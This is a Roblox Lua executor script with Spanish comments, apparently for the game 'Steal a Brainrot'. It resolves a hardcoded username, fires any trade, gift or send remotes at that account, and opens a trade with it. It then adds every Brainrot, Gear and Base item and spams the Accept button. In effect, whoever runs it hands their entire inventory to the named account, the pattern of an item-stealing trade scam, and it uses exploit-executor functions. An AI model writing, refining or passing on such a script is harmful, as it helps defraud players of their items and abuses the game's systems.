--[[
    Auto-Trade Script - Steal a Brainrot
    Target: thiagoppbbcojo_2
    
    Flujo:
      1. Click en "Intercambio" (menú izquierdo, multi-idioma)
      2. Buscar jugador en el input (multi-idioma)
      3. Seleccionar resultado por nombre
      4. Procesar pestañas: Brainrots -> Gear -> Bases
         (clickea "Add All" o todos los items con imagen/texto)
      5. Spam de "Aceptar" cada 4s (cubre las 2 fases del trade)
    
    Soporte offline: resuelve UserId sin que el target esté en el server.
]]

local Players           = game:GetService("Players")
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local HttpService       = game:GetService("HttpService")

local LocalPlayer = Players.LocalPlayer
local TargetName  = "thiagoppbbcojo_2"

-- ═══════════════════════════════════════════════════════════
-- DICCIONARIO MULTI-IDIOMA
-- ═══════════════════════════════════════════════════════════
local DICT = {
    trade = {
        "intercambio", "trade", "trading", "cambiar", "cambio",
        "trocar", "troca", "handel", "échange", "echange", "scambio",
        "trade with", "intercambiar", "negociar", "comerciar"
    },
    search = {
        "buscar un jugador", "buscar jugador", "buscar aqui", "buscar aquí",
        "search player", "search a player", "search here", "search user",
        "search username", "find player", "find user",
        "procurar jogador", "buscar jogador", "pesquisar",
        "suchen spieler", "spieler suchen", "rechercher joueur", "chercher",
        "cerca giocatore", "cercar giocatore", "zoek speler", "szukaj gracza",
        "player name", "username", "nombre de usuario", "nombre jugador",
        "nome de usuário", "nome do jogador", "user name"
    },
    tab_brainrot = {
        "brainrot", "brainrots", "brain rots", "personajes",
        "characters", "pets", "mascotas", "bichos"
    },
    tab_gear = {
        "gear", "gears", "equipo", "equipamiento", "equipos", "items",
        "itens", "objetos", "objects", "herramientas", "tools"
    },
    tab_base = {
        "base", "bases", "base items", "bases items"
    },
    add_all = {
        "add all", "select all", "add everything", "select everything",
        "agregar todo", "añadir todo", "seleccionar todo", "todo a la oferta",
        "adicionar tudo", "selecionar tudo", "alles hinzufügen"
    },
    accept = {
        "accept", "confirm", "send", "offer", "propose", "ready",
        "aceptar", "confirmar", "enviar", "oferta", "proponer", "listo",
        "aceitar", "confirmar", "enviar", "pronto",
        "akzeptieren", "bestätigen", "accepter", "confirmer",
        "accetta", "conferma", "accepteren", "bevestigen"
    }
}

-- ═══════════════════════════════════════════════════════════
-- NORMALIZACIÓN DE TEXTO
-- ═══════════════════════════════════════════════════════════
local ACCENTS = {
    ["á"]="a",["à"]="a",["ä"]="a",["â"]="a",["ã"]="a",
    ["é"]="e",["è"]="e",["ë"]="e",["ê"]="e",
    ["í"]="i",["ì"]="i",["ï"]="i",["î"]="i",
    ["ó"]="o",["ò"]="o",["ö"]="o",["ô"]="o",["õ"]="o",
    ["ú"]="u",["ù"]="u",["ü"]="u",["û"]="u",
    ["ñ"]="n",["ç"]="c",
}

local function norm(s)
    if not s then return "" end
    s = string.lower(s)
    s = s:gsub("[áàäâãéèëêíìïîóòöôõúùüûñç]", ACCENTS)
    return s
end

local function matchesAny(text, list)
    local t = norm(text)
    if t == "" then return false end
    for _, needle in ipairs(list) do
        if t:find(norm(needle), 1, true) then return true end
    end
    return false
end

-- ═══════════════════════════════════════════════════════════
-- HELPERS DE UI
-- ═══════════════════════════════════════════════════════════
local function findElement(textList, preferClass)
    local pg = LocalPlayer:FindFirstChild("PlayerGui")
    if not pg then return nil end
    local candidates = {}
    for _, gui in ipairs(pg:GetDescendants()) do
        local isBtn   = gui:IsA("TextButton") or gui:IsA("ImageButton")
        local isBox   = gui:IsA("TextBox")
        local isLabel = gui:IsA("TextLabel")
        if (isBtn or isBox or isLabel) and gui.Visible then
            local t = gui.Text or ""
            local n = gui.Name or ""
            if matchesAny(t, textList) or matchesAny(n, textList) then
                local score = 0
                if preferClass == "TextBox" and isBox then score = 10 end
                if preferClass == "Button"  and isBtn then score = 10 end
                if isBtn and gui.Active then score = score + 1 end
                if isLabel and not isBtn then score = score - 3 end
                table.insert(candidates, {inst = gui, score = score})
            end
        end
    end
    if #candidates == 0 then return nil end
    table.sort(candidates, function(a, b) return a.score > b.score end)
    return candidates[1].inst
end

local function click(instance)
    if not instance then return end
    if instance:IsA("TextButton") or instance:IsA("ImageButton") then
        pcall(function() instance.Activated:Fire() end)
        pcall(function() instance.MouseButton1Click:Fire() end)
    elseif instance:IsA("TextBox") then
        pcall(function() instance:CaptureFocus() end)
    end
    if type(fireclick) == "function" then
        pcall(function() fireclick(instance) end)
    end
    task.wait(0.12)
end

local function typeIntoTextBox(box, text)
    if not box or not box:IsA("TextBox") then return false end
    pcall(function() box:CaptureFocus() end)
    task.wait(0.1)
    box.Text = text
    task.wait(0.1)
    pcall(function() box:ReleaseFocus() end)
    task.wait(0.1)
    return true
end

-- ═══════════════════════════════════════════════════════════
-- RESOLVER TARGET (ONLINE U OFFLINE)
-- ═══════════════════════════════════════════════════════════
local function getUserIdFromName(name)
    local ok, id = pcall(function() return Players:GetUserIdFromNameAsync(name) end)
    if ok and id then return id end
    for _, p in ipairs(Players:GetPlayers()) do
        if p.Name:lower() == name:lower() then return p.UserId end
    end
    local ok2, resp = pcall(function()
        return HttpService:JSONDecode(
            game:HttpGet("https://users.roblox.com/v1/usernames/users", {
                Method = "POST",
                Headers = {["Content-Type"] = "application/json"},
                Body = HttpService:JSONEncode({usernames = {name}, excludeBannedUsers = false})
            })
        )
    end)
    if ok2 and resp and resp.data and resp.data[1] then return resp.data[1].id end
    return nil
end

local function resolveTarget()
    for _, p in ipairs(Players:GetPlayers()) do
        if p.Name:lower() == TargetName:lower() then return p, p.UserId end
    end
    print("[Trade] '" .. TargetName .. "' offline. Resolviendo UserId...")
    local uid = getUserIdFromName(TargetName)
    if uid then
        print("[Trade] UserId: " .. tostring(uid))
        return nil, uid
    end
    warn("[Trade] No se pudo resolver UserId.")
    return nil, nil
end

local function tryRemoteTradeWithUserId(userId)
    local remotes = {}
    for _, obj in ipairs(ReplicatedStorage:GetDescendants()) do
        if obj:IsA("RemoteEvent") or obj:IsA("RemoteFunction") then
            local n = obj.Name:lower()
            if n:find("trade") or n:find("gift") or n:find("send") then
                table.insert(remotes, obj)
            end
        end
    end
    if #remotes == 0 then
        warn("[Trade] Sin remotes de trade en ReplicatedStorage.")
        return false
    end
    for _, remote in ipairs(remotes) do
        local attempts = {
            function() remote:FireServer(userId) end,
            function() remote:FireServer({UserId = userId, Target = userId}) end,
            function() remote:FireServer("Trade", userId) end,
            function() remote:FireServer(TargetName) end,
        }
        if remote:IsA("RemoteFunction") then
            table.insert(attempts, function() remote:InvokeServer(userId) end)
        end
        for _, fn in ipairs(attempts) do
            pcall(fn)
            task.wait(0.15)
        end
    end
    return true
end

-- ═══════════════════════════════════════════════════════════
-- CLICKEAR TODOS LOS ITEMS DE LA PESTAÑA ACTUAL
-- Detecta "dibujitos" (ImageButton con Image) y texto no-UI
-- ═══════════════════════════════════════════════════════════
local function clickAllItemsInCurrentTab()
    local uiBlocklist = {
        "cancel","cancelar","close","cerrar","back","volver","atras","atrás",
        "accept","aceptar","confirm","confirmar","send","enviar","offer","oferta",
        "propose","proponer","add all","select all","agregar todo","añadir todo",
        "seleccionar todo","trade","intercambio","search","buscar","find",
        "next","siguiente","prev","anterior","page","página","filter","filtro",
        "sort","ordenar","equip","desequip","settings","ajustes","ready","listo",
        "decline","rechazar","reject","deny","no","yes","sí","si",
        "brainrot","brainrots","gear","gears","base","bases","tab","pestaña",
        "all","todo","everything","my items","inventory","inventario"
    }

    local function isUINotItem(text)
        local t = norm(text)
        if t == "" then return true end
        for _, w in ipairs(uiBlocklist) do
            if t == norm(w) then return true end
        end
        return false
    end

    local clicked = 0
    local seen = {}

    for pass = 1, 3 do
        local pg = LocalPlayer:FindFirstChild("PlayerGui")
        if not pg then break end
        for _, obj in ipairs(pg:GetDescendants()) do
            if (obj:IsA("TextButton") or obj:IsA("ImageButton")) and obj.Visible then
                local isImage = obj:IsA("ImageButton") and (obj.Image ~= "" and obj.Image ~= nil)
                local txt = obj.Text or ""
                local hasMeaningfulText = txt ~= "" and not isUINotItem(txt)
                local looksLikeItem = (isImage and not isUINotItem(txt)) or hasMeaningfulText

                if looksLikeItem then
                    local key = obj:GetFullName()
                    if not seen[key] then
                        seen[key] = true
                        click(obj)
                        clicked = clicked + 1
                        task.wait(0.1)
                    end
                end
            end
        end
        task.wait(0.4)
    end

    return clicked
end

-- ═══════════════════════════════════════════════════════════
-- PROCESAR UNA PESTAÑA (brainrot / gear / base)
-- ═══════════════════════════════════════════════════════════
local function processTab(tabKeywords, tabLabel)
    print("[Trade] Procesando pestaña: " .. tabLabel)

    local tabBtn = findElement(tabKeywords, "Button")
    if not tabBtn then
        print("[Trade] Pestaña '" .. tabLabel .. "' no encontrada. Saltando.")
        return 0
    end
    print("[Trade] Click pestaña: " .. tabBtn:GetFullName() .. " | " .. tostring(tabBtn.Text))
    click(tabBtn)
    task.wait(0.8)

    local addAll = findElement(DICT.add_all, "Button")
    if addAll then
        print("[Trade] 'Add All' en " .. tabLabel .. ": " .. addAll:GetFullName())
        click(addAll)
        task.wait(0.6)
        return 1
    end

    print("[Trade] Sin 'Add All'. Clickeando todos los items de " .. tabLabel .. "...")
    local n = clickAllItemsInCurrentTab()
    print("[Trade] Items clickeados en " .. tabLabel .. ": " .. n)
    return n
end

-- ═══════════════════════════════════════════════════════════
-- SPAM DE ACEPTAR (cubre las 2 fases del trade)
-- ═══════════════════════════════════════════════════════════
local function spamAccept(maxClicks, interval)
    maxClicks = maxClicks or 8
    interval  = interval  or 4

    print("[Trade] Spam 'Aceptar': " .. maxClicks .. " clicks cada " .. interval .. "s")

    for i = 1, maxClicks do
        local btn = findElement(DICT.accept, "Button")
        if btn then
            print("[Trade] Click " .. i .. "/" .. maxClicks .. ": " .. btn:GetFullName() .. " | " .. tostring(btn.Text))
            click(btn)
        else
            print("[Trade] Click " .. i .. "/" .. maxClicks .. ": sin botón aceptar visible.")
        end
        if i < maxClicks then
            task.wait(interval)
        end
    end

    print("[Trade] Spam de aceptar finalizado.")
end

-- ═══════════════════════════════════════════════════════════
-- FLUJO PRINCIPAL
-- ═══════════════════════════════════════════════════════════
local function startAutoTrade()
    print("[Trade] Iniciando secuencia...")

    local user, userId = resolveTarget()
    if not userId and not user then
        warn("[Trade] Objetivo no identificado. Abortando.")
        return
    end
    if not user then
        print("[Trade] Jugador offline. Intentando trade por UserId...")
        tryRemoteTradeWithUserId(userId)
    end

    -- PASO 1: Intercambio
    print("[Trade] Paso 1: Buscando 'Intercambio'...")
    local tradeBtn = findElement(DICT.trade, "Button")
    if not tradeBtn then
        warn("[Trade] No se encontró el botón de Intercambio.")
        return
    end
    click(tradeBtn)
    task.wait(0.9)

    -- PASO 2: Buscar jugador
    print("[Trade] Paso 2: Buscando input de búsqueda...")
    local searchBox = findElement(DICT.search, "TextBox")
    if not searchBox then
        warn("[Trade] No se encontró el campo de búsqueda.")
        return
    end
    if searchBox:IsA("TextBox") then
        typeIntoTextBox(searchBox, TargetName)
    else
        pcall(function() searchBox:CaptureFocus() end)
        task.wait(0.1)
        pcall(function() searchBox.Text = TargetName end)
    end
    print("[Trade] Nombre escrito: " .. TargetName)
    task.wait(1.5)

    -- PASO 3: Seleccionar resultado
    print("[Trade] Paso 3: Buscando resultado...")
    local userResult = nil
    for _ = 1, 5 do
        local pg = LocalPlayer:FindFirstChild("PlayerGui")
        if pg then
            for _, btn in ipairs(pg:GetDescendants()) do
                if (btn:IsA("TextButton") or btn:IsA("ImageButton")) and btn.Visible then
                    local txt = norm(btn.Text or "")
                    local nm  = norm(btn.Name or "")
                    if txt:find(norm(TargetName), 1, true) or nm:find(norm(TargetName), 1, true) then
                        userResult = btn; break
                    end
                end
            end
        end
        if userResult then break end
        task.wait(0.5)
    end
    if not userResult then
        warn("[Trade] No apareció el usuario en resultados.")
        return
    end
    click(userResult)
    task.wait(0.9)

    -- PASO 4: Procesar pestañas
    print("[Trade] Paso 4: Procesando pestañas de items...")
    task.wait(0.5)

    local total = 0
    total = total + processTab(DICT.tab_brainrot, "Brainrots")
    total = total + processTab(DICT.tab_gear,     "Gear")
    total = total + processTab(DICT.tab_base,     "Bases")

    print("[Trade] Items totales procesados: " .. total)

    -- PASO 5: Spam de aceptar (2 fases)
    print("[Trade] Paso 5: Esperando registro de oferta...")
    task.wait(1.5)

    spamAccept(8, 4)

    print("[Trade] Proceso finalizado para " .. TargetName .. " (UserID: " .. tostring(userId) .. ")")
end

task.spawn(startAutoTrade)
